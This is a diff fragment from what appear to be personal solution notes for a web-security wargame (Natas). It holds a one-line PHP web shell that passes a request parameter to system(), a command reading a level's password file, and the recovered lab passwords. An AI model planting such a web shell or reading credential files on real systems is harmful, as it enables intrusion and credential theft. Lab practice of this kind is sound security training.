@@ -44,4 +44,8 @@
 > 	$s=$_REQUEST['simba']; system($s);
 * jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
 
+#### Level14
+* cat /etc/natas_webpass/natas14
+* Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
 
